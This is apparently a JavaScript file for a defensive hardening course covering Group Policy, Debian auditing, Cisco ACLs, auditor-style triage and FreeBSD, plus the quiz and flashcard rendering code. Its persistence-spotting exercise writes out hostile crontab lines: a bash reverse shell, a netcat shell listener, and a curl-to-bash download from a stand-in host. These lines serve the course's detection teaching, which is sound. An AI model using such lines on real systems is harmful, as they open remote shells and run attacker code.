 {id:'j2',title:'Group Policy',bloom:'Apply',sum:'How GPOs enforce settings across a domain, the high-value ones, and how to confirm they applied.',
  blocks:[
   C('One place to set a thousand machines','Understand',
     TIPS('A <b>Group Policy Object</b> (GPO) is a bundle of settings linked to the domain or an organizational unit. Settings flow down to the computers and users underneath.',
          'The <b>Default Domain Policy</b> carries password and lockout policy for the whole domain. Edit it in <b>Group Policy Management</b> (<code>gpmc.msc</code>).',
          'Computer settings apply at boot and refresh periodically; user settings at logon. Force a refresh with <code>gpupdate /force</code>.',
          'High-value areas: Account Policies, User Rights Assignment, Security Options, Audit Policy, and Administrative Templates for Windows components.'),
     CMDS('Work with and verify GPOs',[
       ['gpmc.msc','Group Policy Management: create, link, and edit GPOs.'],
       ['gpupdate /force','Reapply policy now instead of waiting.'],
       ['gpresult /r','What policy is actually applied to this machine and user.'],
       ['Get-ADDefaultDomainPasswordPolicy','Confirm domain password settings after editing the Default Domain Policy.'],
       ['auditpol /get /category:*','Current audit policy. Enable logon and account-management auditing where the brief or good practice calls for it.']
     ])),
   ORDER('j2o','Order: enforce a domain password policy','Put the steps in order.',[
     ['Open Group Policy Management (gpmc.msc)','You edit domain policy here, not in local secpol.'],
     ['Edit the Default Domain Policy','This GPO owns password and lockout policy for all domain accounts.'],
     ['Set Account Policies: minimum length, complexity, history, max age','The settings themselves, following your organization’s policy.'],
     ['Set Account Lockout Policy: threshold, duration, reset counter','Slows brute force across the domain.'],
     ['Run gpupdate /force on the DC','Apply immediately instead of waiting for the refresh cycle.'],
     ['Verify with Get-ADDefaultDomainPasswordPolicy','Prove the change took effect before moving on.']
   ]),
   QUIZ('j2q','Check: Group Policy',[
     ['A setting in the Default Domain Policy is not showing up on a workstation. First command?',['shutdown /r','gpupdate /force then gpresult /r','net accounts','ipconfig /flushdns'],1,'Force the refresh, then confirm what applied. gpresult /r shows which GPOs won.'],
     ['Which policy area would you use to stop a normal user from logging on locally to the DC?',['Password Policy','User Rights Assignment','Windows Update','Firewall'],1,'User Rights Assignment controls "Allow/Deny log on locally" and similar rights.'],
     ['Domain password policy belongs in',['each local machine’s secpol','the Default Domain Policy GPO','the hosts file','Task Scheduler'],1,'One GPO at the domain level governs every domain account.'],
     ['gpresult /r is for',['forcing a policy refresh','showing which policies are applied here','creating a GPO','editing the registry'],1,'It reports applied policy. gpupdate applies; gpresult reports.']
   ]),
   LINKS('Go further',['ms-winsrv','ms-baselines','stig','t4t-ld-winsrv'])
  ]},
 {id:'j3',title:'Debian and deeper Linux',bloom:'Analyze',sum:'What differs from Mint and Ubuntu, plus auditing, logging, cron, kernel parameters and finding persistence.',
  blocks:[
   C('Debian differences and deeper hardening','Analyze',
     TIPS('Debian (12 "bookworm", 13 "trixie") is close to Ubuntu but leaner. New installs do not include rsyslog; logs live in the systemd journal, so use <code>journalctl</code> rather than /var/log/auth.log. Some setups use a custom admin group; confirm with <code>sudo -l</code> and <code>/etc/sudoers</code>.',
          'No firewall front end by default: ufw may not be installed. Check with <code>which ufw</code>; nftables is the native packet filter.',
          'Services you may meet: Apache or nginx, MySQL/MariaDB, Samba, Postfix, vsftpd, Bind9. Harden the ones the brief keeps.',
          'Think in the six areas, not in commands: accounts, access, configuration, patching, malware and persistence, logging.'),
     CMDS('Audit and investigate',[
       ['sudo journalctl -p err -b','Errors since boot. Add --since "1 hour ago" to narrow.'],
       ['sudo journalctl -u ssh --since today','Logs for one service.'],
       ['systemctl list-unit-files --state=enabled','What starts at boot. Disable what the brief does not need.'],
       ['crontab -l; sudo crontab -l','User and root cron jobs. Also check /etc/cron.* and /etc/crontab for rogue entries.'],
       ['ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly','Cron drop-in directories: a classic persistence spot.'],
       ['sudo grep -R "" /etc/systemd/system/*.service 2>/dev/null | grep -i exec','Look at ExecStart lines for odd commands in custom units.'],
       ['sudo ss -tulnp','Listening sockets with process. Match to the services you expect.'],
       ['sudo lsof -i -nP 2>/dev/null','Every network connection by process, confirming what ss shows.'],
       ['sudo find / -newermt "2026-01-01" -type f 2>/dev/null | grep -vE "^/proc|^/sys"','Files changed after a date: scoping recent tampering.']
     ])),
   C('Kernel and logging baseline','Apply',
     CMDS('sysctl, auditd and the journal',[
       ['sudo sysctl -w net.ipv4.conf.all.rp_filter=1','Reverse-path filtering (anti-spoofing). Persist in a file under /etc/sysctl.d/.'],
       ['sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1','Ignore broadcast pings (smurf protection).'],
       ['sudo sysctl -w kernel.randomize_va_space=2','Full ASLR, a memory-corruption mitigation.'],
       ['sudo apt install auditd && sudo systemctl enable --now auditd','Kernel audit logging of security events.'],
       ['journalctl --list-boots','More than one boot listed means the journal survives reboots. If not, set Storage=persistent in /etc/systemd/journald.conf and restart systemd-journald.']
     ])),
   SPOT('j3sp','Spot the persistence: crontab -l','Tap every line that looks like a backdoor or does not belong, then Check.',[
     ['# m h  dom mon dow   command',null],
     ['0 3 * * * /usr/bin/apt-get update',null],
     ['*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\'','A reverse shell every five minutes. Remove it and hunt for whatever installed it.'],
     ['0 2 * * 0 /usr/local/bin/backup.sh',null],
     ['@reboot nc -lvp 1337 -e /bin/bash','A netcat backdoor that re-opens on every reboot. Remove.'],
     ['30 1 * * * certbot renew --quiet',null],
     ['* * * * * curl -s http://malware.example/x.sh | bash','Downloads and runs a script every minute (malware.example is a reserved example name). Remove immediately.']
   ]),
   QUIZ('j3q','Check: deeper Linux',[
     ['On a fresh Debian install, /var/log/auth.log is missing. Where do you read authentication events?',['It cannot be done','journalctl, the systemd journal','/etc/passwd','dmesg only'],1,'Since Debian 12, rsyslog is not installed by default, so Debian logs to the journal. For SSH logins use journalctl -u ssh. (Filtering on the process name sshd misses them on Debian 13: since OpenSSH 9.8 they come from sshd-session.)'],
     ['A cron line runs bash -i >& /dev/tcp/.../4444. This is',['A backup','A reverse shell backdoor','A system update','A log rotation'],1,'That is an attacker call-home. Remove the line and investigate how it got there (check all cron dirs, systemd units, .bashrc).'],
     ['Which sysctl helps against IP address spoofing?',['kernel.randomize_va_space','net.ipv4.conf.all.rp_filter','vm.swappiness','fs.file-max'],1,'rp_filter drops packets whose source could not have arrived on that interface.'],
     ['Best single command to see what is listening and which process owns it?',['ps aux','sudo ss -tulnp','top','df -h'],1,'ss -tulnp ties ports to processes, the question you ask on every machine.']
   ]),
   LINKS('Go further',['debian-handbook','debian-security','debian-wiki','cis','stig','explainshell','t4t-lr-linux'])
  ]},
 {id:'j4',title:'Cisco: VLANs, routing and ACLs',bloom:'Apply',sum:'Segment a network with VLANs, route between them, and filter traffic with access lists.',
  blocks:[
   C('VLANs and trunks','Apply',
     CMDS('Segment the switch',[
       ['vlan 10','Create a VLAN. Then: name SALES'],
       ['interface range fastethernet0/1 - 8','Several ports at once.'],
       ['switchport mode access','These are host ports, not trunks.'],
       ['switchport access vlan 10','Put the ports in VLAN 10.'],
       ['interface gigabitethernet0/1','The link to the router or another switch.'],
       ['switchport mode trunk','Carry multiple VLANs over one link.'],
       ['switchport trunk allowed vlan 10,20','Only the VLANs you intend. Fewer VLANs on a trunk means less exposure.'],
       ['show vlan brief','Verify port-to-VLAN assignments.'],
       ['show interfaces trunk','Verify the trunk and allowed VLANs.']
     ])),
   C('Inter-VLAN routing and ACLs','Apply',
     CMDS('Route, then filter',[
       ['interface gigabitethernet0/0/0.10','Router subinterface for VLAN 10 (router-on-a-stick).'],
       ['encapsulation dot1q 10','Tag this subinterface for VLAN 10.'],
       ['ip address 192.168.10.1 255.255.255.0','Gateway for VLAN 10 hosts.'],
       ['access-list 10 permit 192.168.10.0 0.0.0.255','Standard ACL: match a source network with a wildcard mask (inverse of the subnet mask).'],
       ['ip access-list extended BLOCK_TELNET','Named extended ACL for protocol/port control.'],
       ['deny tcp any any eq 23','Inside the named ACL: block Telnet everywhere.'],
       ['permit ip any any','End with a permit when you only mean to block some traffic, or the implicit deny drops everything.'],
       ['interface gigabitethernet0/0/0.10','Apply the ACL: then ip access-group BLOCK_TELNET in'],
       ['show access-lists','Verify ACLs and hit counts.'],
       ['show ip route','Verify routing, including connected VLAN subnets.']
     ]),
     NOTE('Every ACL ends with an invisible <code>deny any</code>. If you only write deny statements, you block all traffic. Order matters: the first match wins.')),
   QUIZ('j4q','Check: switching and routing',[
     ['The wildcard mask for the subnet 255.255.255.0 in an ACL is',['255.255.255.0','0.0.0.255','255.255.255.255','0.0.0.0'],1,'Wildcard masks are the inverse of the subnet mask. 0 means "must match", 255 means "any".'],
     ['Hosts in VLAN 10 and VLAN 20 cannot reach each other. What provides the path?',['A second switch','Inter-VLAN routing (router subinterfaces or a layer 3 switch)','A longer cable','Disabling the firewall'],1,'VLANs are separate networks; something at layer 3 must route between them.'],
     ['Your extended ACL has only "deny tcp any any eq 23". Hosts lose all connectivity. Why?',['Telnet is required','The implicit deny any at the end drops everything else','ACLs do not work on routers','The switch is off'],1,'Add permit ip any any after the deny so other traffic passes.'],
     ['Which command shows which ports belong to which VLAN?',['show ip route','show vlan brief','show running-config | include ip','show mac address-table'],1,'show vlan brief maps VLANs to access ports. show interfaces trunk shows the trunks.']
   ]),
   LINKS('Go further',['t4t-ios','t4t-audit','t4t-tickets','t4t-lr-ios','netacad','pt'])
  ]},
 {id:'j5',title:'Evaluate a configuration',bloom:'Evaluate',sum:'Read a config or a system like an auditor: rank findings by impact and defend the order.',
  blocks:[
   C('Thinking like an auditor','Evaluate',
     P('At this grade you stop asking "is this a finding?" and start asking "which finding do I fix first?" Rank by <b>impact</b> (how much an attacker gains) and <b>effort</b> (how fast you fix it). A domain admin backdoor outranks a missing login banner even though both are findings.'),
     TIPS('High impact: extra administrators, UID-0 backdoors, reverse shells, root SSH login, blank or shared passwords, disabled firewall and antivirus.',
          'Medium: missing updates, weak password policy, insecure services the brief does not need, over-broad shares.',
          'Low but worth doing: banners, screen-lock timeouts, audit logging, SMBv1, unauthorized media files.',
          'Always weigh availability risk: a "fix" that stops a required service is an outage, which is worse than leaving the finding for later.')),
   ORDER('j5o','Rank the findings on one machine','Order these from fix-first to fix-last by impact, assuming none is a required service.',[
     ['A second account with UID 0','An unauthorized root. Total compromise; fix immediately.'],
     ['A reverse-shell cron job calling out to the internet','Active backdoor; remove now and find its source.'],
     ['Guest account enabled with blank password','Trivial anonymous access; disable at once.'],
     ['SSH permits root login with a password','Direct remote path to the crown jewels; close it.'],
     ['No automatic updates and 40 missing patches','Serious but slower to exploit than an open door; patch next.'],
     ['Missing login banner and 15-minute screen lock','Low impact, still worth fixing; mop up at the end.']
   ]),
   QUIZ('j5q','Check: judgment',[
     ['Two findings: (a) Telnet running, required by the brief for a legacy device; (b) a netcat listener on 1337 not in the brief. Which do you remove?',['Both','Only (b); harden and restrict (a)','Only (a)','Neither'],1,'Required services get hardened and restricted, not removed. The unlisted listener is malware.'],
     ['Your maintenance window closes in ten minutes. Which usually reduces the most risk per minute?',['Writing a login banner','Confirming no unauthorized admins remain and the firewall and antivirus are on','Renaming the Administrator account','Reading the whole config again'],1,'High-impact areas first. Cheap, high-value checks beat cosmetic ones under time pressure.'],
     ['A teammate wants to delete a user to "be safe," but the brief lists that user as authorized. Your call?',['Delete it','Keep it; deleting an authorized user breaks something the business needs','Disable it, then delete it','Rename it'],1,'Authorized means protected. Disabling it is also wrong here; leave it and secure it.'],
     ['Why rank findings at all instead of fixing them top to bottom?',['It looks professional','Time is limited and impact varies; ranking removes the most risk soonest','The firewall requires it','It does not matter'],1,'Triage is the skill. Highest impact, lowest effort, lowest availability risk, first.']
   ]),
   LINKS('Go further',['t4t-audit','stig','cis','nist-csf'])
  ]}
 ]
});

LEVELS.push({
 id:'senior', grade:'Senior', range:'Advanced to team lead', color:'var(--l4)', chev:4,
 blooms:['An','E','Cr'], bloomCap:'Analyze, evaluate and create. You build systems: a checklist, a role plan, a runbook.',
 intro:'FreeBSD and web application security join the mix, and the differentiator stops being knowledge. It becomes a team that works like a system: a checklist written from standards, clear roles, a time plan, and the discipline to understand every change before making it. This grade is where you create those artifacts, and own the ethics that come with the skill.',
 mentor:['Hand the pen to the learners. Your job here is to review what they create (checklist, role plan, runbook), not to dictate it.','Run full timed practice sessions on Lockdown Range or your own VMs, then debrief. The debrief, not the run, is where the learning lands.','Train every fix by hand before anyone automates it. A script nobody on the team can explain is a liability.','Make the ethics conversation explicit and recurring. These learners can now do real damage; the whole point is that they choose not to.'],
 units:[
 {id:'se1',title:'FreeBSD',bloom:'Analyze',sum:'A different Unix: where the files live, how services and the firewall work, and how to map your Linux habits across.',
  blocks:[
   C('Translate your Linux instincts','Analyze',
     TIPS('FreeBSD is Unix but not Linux. The base system and third-party <b>ports/packages</b> are separate. Package tool: <code>pkg</code>.',
          'Services are enabled in <b>/etc/rc.conf</b> (or with <code>sysrc</code>) and started or stopped with <code>service</code>. There is no systemd.',
          'FreeBSD has three firewalls built into the base system: <b>pf</b>, <b>ipfw</b> and <b>ipf</b> (IPFILTER). pf rules live in <code>/etc/pf.conf</code>.',
          'Users: <code>pw</code> manages accounts; membership in the <b>wheel</b> group is required to <code>su</code> to root; sudo, if installed from packages, is configured in <code>/usr/local/etc/sudoers</code>.',
          'Updating: <code>freebsd-update fetch install</code> for the base system, <code>pkg update &amp;&amp; pkg upgrade</code> for packages. On a system installed from base packages (pkgbase, FreeBSD 15 and later), <code>pkg upgrade -r FreeBSD-base</code> patches the base instead.'),
     CMDS('FreeBSD essentials',[
       ['cat /etc/passwd','Same format idea as Linux. Hunt for UID 0 accounts: besides root, some FreeBSD releases ship toor, a spare superuser whose login is disabled (* in master.passwd). Anything else at UID 0 is a finding.'],
       ['pw groupshow wheel','Who can su to root. Compare to the scenario brief.'],
       ['pw groupmod wheel -d dave','Remove dave from wheel.'],
       ['pw lock bob','Lock an account (pw unlock bob reverses it).'],
       ['sysrc -a','Show rc.conf settings (what is enabled at boot).'],
       ['service -e','List enabled services.'],
       ['service sshd restart','Start/stop/restart a service by name.'],
       ['sockstat -4 -l','Listening IPv4 sockets with the owning process (FreeBSD’s answer to ss).'],
       ['pkg info','Installed packages. pkg which /path traces a file to its package.'],
       ['freebsd-update fetch install','Patch the base system. On a pkgbase install: pkg upgrade -r FreeBSD-base.'],
       ['vi /etc/pf.conf','Firewall rules. Then: pfctl -f /etc/pf.conf to load, pfctl -e to enable.']
     ])),
   C('A minimal pf firewall','Apply',
     TERM('# /etc/pf.conf  (default deny inbound, allow outbound, permit SSH)\next_if = "em0"\nset skip on lo\nblock in all\npass out all keep state\npass in on $ext_if proto tcp to ($ext_if) port 22 keep state'),
     TIPS('Load and enable: <code>pfctl -f /etc/pf.conf</code> then <code>pfctl -e</code>. Check rules with <code>pfctl -sr</code>.',
          'Enable at boot: <code>sysrc pf_enable=YES</code> and <code>sysrc pf_rules=/etc/pf.conf</code>.',
          'Open only the ports the brief needs. The idea is identical to ufw; the syntax is new.')),
   QUIZ('se1q','Check: FreeBSD',[
     ['Which group lets a user su to root on FreeBSD?',['sudo','wheel','admin','root'],1,'wheel. Membership in wheel is required to su, and sudo (if present) is configured separately.'],
     ['How do you enable a service at boot on FreeBSD?',['systemctl enable','edit /etc/rc.conf (or sysrc name_enable=YES)','update-rc.d','chkconfig on'],1,'rc.conf plus the service command. No systemd here.'],

/* =====================================================================
   STORAGE (per-viewer, this browser only; degrades to memory if blocked)
   ===================================================================== */
const KEY='defense-ladder-v1';
let MEM={};
const store={
  load(){ try{ const r=localStorage.getItem(KEY); MEM=r?JSON.parse(r):{}; }catch(e){ MEM={}; } return MEM; },
  save(){ try{ localStorage.setItem(KEY,JSON.stringify(MEM)); }catch(e){} },
  get(id){ return MEM[id]; },
  set(id,v){ MEM[id]=v; this.save(); }
};
store.load();

/* theme */
const themeBtn=document.getElementById('themeBtn');
function applyTheme(t){
  if(t==='light'||t==='dark') document.documentElement.setAttribute('data-theme',t);
  else document.documentElement.removeAttribute('data-theme');
  themeBtn.textContent='Theme: '+(t||'auto');
}
let theme=(function(){ try{return localStorage.getItem(KEY+'-theme')||'auto';}catch(e){return 'auto';} })();
applyTheme(theme);
themeBtn.addEventListener('click',()=>{
  theme = theme==='auto'?'light':theme==='light'?'dark':'auto';
  try{localStorage.setItem(KEY+'-theme',theme);}catch(e){}
  applyTheme(theme);
});

/* =====================================================================
   small helpers
   ===================================================================== */
const el=(tag,cls,html)=>{const n=document.createElement(tag);if(cls)n.className=cls;if(html!=null)n.innerHTML=html;return n;};
const shuffle=a=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;};
const bloomName={R:'Remember',U:'Understand',A:'Apply',An:'Analyze',E:'Evaluate',Cr:'Create'};
const bloomFull=['Remember','Understand','Apply','Analyze','Evaluate','Create'];
const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

/* chevron icon for a level (stacked chevrons = grade) */
function chevSvg(n,color){
  const w=16,gap=5; let p='';
  for(let i=0;i<4;i++){
    const on=i<n;
    p+=`<path d="M2 ${4+i*gap} L8 ${1+i*gap} L14 ${4+i*gap}" fill="none" stroke="${on?color:'var(--line)'}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>`;
  }
  return `<svg width="${w}" height="26" viewBox="0 0 16 26" aria-hidden="true">${p}</svg>`;
}

/* =====================================================================
   NAV state
   ===================================================================== */
const PAGES=[['plan','Study plan'],['scorecard','Hardening scorecard'],['progress','My progress'],['about','About & links']];
let current={level:LEVELS[0].id, unit:LEVELS[0].units[0].id, page:'level'};

function levelById(id){return LEVELS.find(l=>l.id===id);}
function allInteractiveIds(){
  const ids=[];
  LEVELS.forEach(l=>l.units.forEach(u=>u.blocks.forEach(b=>{ if(b.id) ids.push(b.id); })));
  return ids;
}
function isDone(id){const v=store.get(id);return v&&v.done;}

/* =====================================================================
   RAIL
   ===================================================================== */
function buildRail(){
  const ladder=document.getElementById('ladder');
  ladder.innerHTML='';
  LEVELS.forEach(l=>{
    const b=el('button','lv');
    b.style.setProperty('--c',l.color);
    b.setAttribute('role','tab');
    b.innerHTML=chevSvg(l.chev,l.color)+`<span class="lv-t"><span class="lv-g">${l.grade}</span><span class="lv-p">${l.range}</span></span>`;
    b.addEventListener('click',()=>{current={level:l.id,unit:l.units[0].id,page:'level'};render();});
    ladder.appendChild(b);
  });
  const pages=document.getElementById('pages');
  pages.innerHTML='';
  PAGES.forEach(([id,label])=>{
    const b=el('button','pg',label);
    b.addEventListener('click',()=>{current={page:id};render();});
    pages.appendChild(b);
  });
}

function markRail(){
  const lvs=document.querySelectorAll('#ladder .lv');
  LEVELS.forEach((l,i)=>lvs[i].setAttribute('aria-current', current.page==='level'&&current.level===l.id?'true':'false'));
  const pgs=document.querySelectorAll('#pages .pg');
  pgs.forEach((p,i)=>p.setAttribute('aria-current', current.page===PAGES[i][0]?'true':'false'));
}

/* =====================================================================
   RENDER
   ===================================================================== */
const main=document.getElementById('main');
let booted=false;
function render(){
  main.innerHTML='';
  if(current.page==='level') renderLevel();
  else if(current.page==='plan') renderPlan();
  else if(current.page==='scorecard') renderScorecard();
  else if(current.page==='progress') renderProgress();
  else if(current.page==='about') renderAbout();
  markRail();
  if(booted) syncHash();
  main.focus();
  window.scrollTo(0,0);
}

/* =====================================================================
   UNIT LINKS: #<grade>/<unit>, e.g. #freshman/f7 (unit ids are stable; never renumber)
   ===================================================================== */
function syncHash(){
  const h=current.page==='level'?'#'+current.level+'/'+current.unit:'';
  if(location.hash===h) return;
  try{ history.replaceState(null,'',location.pathname+location.search+h); }catch(e){}
}
function unitFromHash(){
  const m=/^#([a-z]+)\/([a-z]+[0-9]+)$/.exec(location.hash||'');
  const L=m&&levelById(m[1]);
  const U=L&&L.units.find(u=>u.id===m[2]);
  return U?{level:L.id,unit:U.id,page:'level'}:null;
}
function route(){
  const target=unitFromHash();
  current=target||{level:LEVELS[0].id,unit:LEVELS[0].units[0].id,page:'level'};
  render();
  if(target){ const uh=main.querySelector('.uhead'); if(uh) uh.scrollIntoView({block:'start'}); }
}
window.addEventListener('hashchange',route);

function renderLevel(){
  const L=levelById(current.level);
  const head=el('div','lvhead');
  head.style.setProperty('--accent',L.color);
  document.documentElement.style.setProperty('--accent',L.color);
  head.innerHTML=`<div class="grade">${L.grade}</div><div class="range">${L.range}</div>`;
  const bloom=el('div','bloom');
  bloomFull.forEach(bf=>{
    const on=L.blooms.map(b=>bloomName[b]).includes(bf);
    const s=el('span',on?'on':'',bf);
    bloom.appendChild(s);
  });
  head.appendChild(bloom);
  head.appendChild(el('div','bloom-cap',L.bloomCap));
  head.appendChild(el('p','intro',L.intro));
  if(L.mentor){
    const d=el('details','mentor');
    d.innerHTML='<summary>For instructors and study leads</summary><ul>'+L.mentor.map(m=>`<li>${m}</li>`).join('')+'</ul>';
    head.appendChild(d);
  }
  main.appendChild(head);

  // unit chips
  const units=el('div','units');
  L.units.forEach(u=>{
    const chip=el('button','unit');
    const st=unitStatus(u);
    chip.innerHTML=`<span class="dot ${st}"></span>${u.title}`;
    chip.setAttribute('aria-current', u.id===current.unit?'true':'false');
    chip.style.setProperty('--accent',L.color);
    chip.addEventListener('click',()=>{current.unit=u.id;render();});
    units.appendChild(chip);
  });
  main.appendChild(units);

  const U=L.units.find(u=>u.id===current.unit)||L.units[0];
  const uh=el('div','uhead');
  uh.innerHTML=`<h2>${U.title}<span class="blm">${U.bloom}</span></h2><p class="sum">${U.sum}</p>`;
  main.appendChild(uh);

  U.blocks.forEach(b=>main.appendChild(renderBlock(b,L)));

  // unit pager
  const idx=L.units.findIndex(u=>u.id===U.id);
  const pager=el('div','row');
  if(idx>0){const p=el('button','btn sec','\u2190 '+L.units[idx-1].title);p.addEventListener('click',()=>{current.unit=L.units[idx-1].id;render();});pager.appendChild(p);}
  if(idx<L.units.length-1){const n=el('button','btn','Next: '+L.units[idx+1].title+' \u2192');n.addEventListener('click',()=>{current.unit=L.units[idx+1].id;render();});pager.appendChild(n);}
  else{
    const li=LEVELS.findIndex(x=>x.id===L.id);
    if(li<LEVELS.length-1){const n=el('button','btn','Start '+LEVELS[li+1].grade+' \u2192');n.addEventListener('click',()=>{current={level:LEVELS[li+1].id,unit:LEVELS[li+1].units[0].id,page:'level'};render();});pager.appendChild(n);}
    else{const n=el('button','btn','See the study plan \u2192');n.addEventListener('click',()=>{current={page:'plan'};render();});pager.appendChild(n);}
  }
  main.appendChild(pager);
}

function unitStatus(u){
  const ids=u.blocks.filter(b=>b.id).map(b=>b.id);
  if(!ids.length) return '';
  const done=ids.filter(isDone).length;
  if(done===0) return '';
  if(done===ids.length) return 'full';
  return 'part';
}
/* =====================================================================
   BLOCK RENDERERS
   ===================================================================== */
function renderBlock(b,L){
  switch(b.t){
    case 'c': return renderCard(b);
    case 'p': return el('p',null,b.html);
    case 'tips': { const u=el('ul');b.items.forEach(i=>u.appendChild(el('li',null,i)));return u; }
    case 'cmds': return renderCmds(b);
    case 'term': return renderTerm(b);
    case 'note': return el('div','note'+(b.warn?' warn':''),b.html);
    case 'areas': return renderAreas();
    case 'flash': return renderFlash(b);
    case 'quiz': return renderQuiz(b);
    case 'match': return renderMatch(b);
    case 'spot': return renderSpot(b);
    case 'order': return renderOrder(b);
    case 'lab': return renderLab(b);
    case 'reflect': return renderReflect(b);
    case 'builder': return renderBuilder(b);
    case 'planner': return renderPlanner(b);
    case 'timer': return renderTimer(b);
    case 'links': return renderLinks(b);
    default: return el('div');
  }
}

function renderCard(b){
  const c=el('div','card');
  c.appendChild(el('h3',null,`${b.title}<span class="blm">${b.bloom}</span>`));
  b.parts.forEach(p=>c.appendChild(renderBlock(p)));
  return c;
}
function renderCmds(b){
  const wrap=el('div');
  if(b.title) wrap.appendChild(el('p',null,`<b>${b.title}</b>`));
  const t=el('table','cmds');
  b.rows.forEach(([cmd,why])=>{
    const tr=el('tr');
    tr.appendChild(el('td',null,`<code>${esc(cmd)}</code>`));
    tr.appendChild(el('td',null,why));
    t.appendChild(tr);
  });
  wrap.appendChild(t);
  return wrap;
}
function renderTerm(b){ return el('pre','term',esc(b.text)); }

function renderAreas(){
  const t=el('table','cmds areas');
  AREAS.forEach((a,i)=>{
    const tr=el('tr');
    tr.appendChild(el('td',null,`<b>${i+1}. ${a.n}</b><br><small>${a.cis}</small>`));
    tr.appendChild(el('td',null,a.d));
    t.appendChild(tr);
  });
  return t;
}

/* ---- flashcards ---- */
function renderFlash(b){
  const c=el('div','card');
  c.appendChild(el('h3',null,`${b.title}<span class="blm">Remember</span>`));
  c.appendChild(el('p','sum','Tap the card (or press Enter or Space) to flip. Next to continue. '+b.cards.length+' cards.'));
  const flash=el('div','flash');
  const fc=el('div','fc');
  fc.tabIndex=0;
  fc.setAttribute('role','button');
  fc.setAttribute('aria-live','polite');
  let i=0, back=false;
  const state=store.get(b.id)||{};
  function draw(){
    fc.className='fc'+(back?' back':'');
    fc.setAttribute('aria-label',(back?'Answer':'Term')+', card '+(i+1)+' of '+b.cards.length+'. Press to flip.');
    fc.innerHTML=`<span class="side">${back?'Answer':'Term'}</span><span class="cnt">${i+1} / ${b.cards.length}</span><div>${back?b.cards[i][1]:b.cards[i][0]}</div>`;
  }
  fc.addEventListener('click',()=>{back=!back;draw();});
  fc.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();back=!back;draw();}});
  flash.appendChild(fc);
  c.appendChild(flash);
  const row=el('div','row');
  const prev=el('button','btn sec sm','\u2190 Prev');
  const next=el('button','btn sm','Next \u2192');
  const done=el('button','btn sec sm','Mark reviewed');
  const status=el('span','pill');
  function setStatus(){status.textContent=isDone(b.id)?'Reviewed':'';status.className='pill'+(isDone(b.id)?' ok':'');}
  prev.addEventListener('click',()=>{i=(i-1+b.cards.length)%b.cards.length;back=false;draw();});
  next.addEventListener('click',()=>{i=(i+1)%b.cards.length;back=false;draw();});
  done.addEventListener('click',()=>{store.set(b.id,{done:true});setStatus();refreshChrome();});
  row.append(prev,next,done,status);
  c.appendChild(row);
  draw();setStatus();
  return c;
}

/* ---- quiz ---- */
function renderQuiz(b){
  const c=el('div','card');
  c.appendChild(el('h3',null,`${b.title}<span class="blm">Check</span>`));
  const answered=new Array(b.items.length).fill(-1);
  const saved=store.get(b.id);
  b.items.forEach((it,qi)=>{
    const [q,opts,correct,why]=it;
    const q1=el('div','q');
    q1.appendChild(el('div','qt',`${qi+1}. ${q}`));
    const whyBox=el('div','why',why); whyBox.style.display='none';
    opts.forEach((opt,oi)=>{
      const lab=el('label','opt');
      lab.innerHTML=`<input type="radio" name="${b.id}-${qi}"><span>${opt}</span>`;
      lab.querySelector('input').addEventListener('change',()=>{
        answered[qi]=oi;
        [...q1.querySelectorAll('.opt')].forEach((o,k)=>{o.className='opt'+(k===correct?' right':k===oi&&oi!==correct?' wrong':'');});
        whyBox.style.display='block';
        maybeDone();
      });
      q1.appendChild(lab);
    });
    q1.appendChild(whyBox);
    c.appendChild(q1);
  });
  const foot=el('div','row');
  const score=el('span','pill');
  foot.appendChild(score);
  c.appendChild(foot);
  function maybeDone(){
    const got=answered.filter(a=>a>=0).length;
    const right=answered.reduce((n,a,qi)=>n+(a===b.items[qi][2]?1:0),0);
    score.textContent=`${right} / ${b.items.length} correct`;
    score.className='pill'+(got===b.items.length?(right===b.items.length?' ok':' '):' ');
    if(got===b.items.length){
      store.set(b.id,{done:true,score:right,total:b.items.length});
      if(right===b.items.length) score.className='pill ok';
      refreshChrome();
    }
  }
  if(saved&&saved.total){score.textContent=`Best: ${saved.score} / ${saved.total}. Answer again to review.`;score.className='pill'+(saved.score===saved.total?' ok':'');}
  return c;
}

/* ---- match ---- */
function renderMatch(b){
  const c=el('div','card');
  c.appendChild(el('h3',null,`${b.title}<span class="blm">Understand</span>`));
  if(b.intro) c.appendChild(el('p','sum',b.intro));
  const grid=el('div','match');
  const left=b.pairs.map((p,i)=>({txt:p[0],i}));
  const right=shuffle(b.pairs.map((p,i)=>({txt:p[1],i})));
  let sel=null, matched=0;
  const colL=el('div'); const colR=el('div');
  colL.style.display='flex';colL.style.flexDirection='column';colL.style.gap='8px';
  colR.style.display='flex';colR.style.flexDirection='column';colR.style.gap='8px';
  const Lbtns={}, Rbtns={};
  left.forEach(o=>{const btn=el('button','mi',o.txt);btn.addEventListener('click',()=>pick('L',o.i,btn));colL.appendChild(btn);Lbtns[o.i]=btn;});
  right.forEach(o=>{const btn=el('button','mi',o.txt);btn.addEventListener('click',()=>pick('R',o.i,btn));colR.appendChild(btn);Rbtns[o.i]=btn;});
  grid.append(colL,colR);
  c.appendChild(grid);
  const status=el('div','row');const pill=el('span','pill');status.appendChild(pill);c.appendChild(status);
  const explain=b.pairs.some(p=>p[2]);
  const whyEl=el('div');whyEl.setAttribute('aria-live','polite');if(explain)c.appendChild(whyEl);
  function pick(side,i,btn){
    if(btn.classList.contains('done'))return;
    if(!sel){sel={side,i,btn};btn.classList.add('sel');return;}
    if(sel.side===side){sel.btn.classList.remove('sel');sel={side,i,btn};btn.classList.add('sel');return;}
    // compare
    if(sel.i===i){
      sel.btn.classList.remove('sel');sel.btn.classList.add('done');btn.classList.add('done');
      matched++;
      whyEl.innerHTML='';
      if(matched===b.pairs.length){pill.textContent='All matched';pill.className='pill ok';store.set(b.id,{done:true});refreshChrome();}
      sel=null;
    } else {
      const a=sel.btn,bb=btn;a.classList.add('shake');bb.classList.add('shake');
      setTimeout(()=>{a.classList.remove('shake','sel');bb.classList.remove('shake');},500);
      const ri=side==='R'?i:sel.i;
      sel=null;
      pill.textContent='Not a match, try again';pill.className='pill bad';
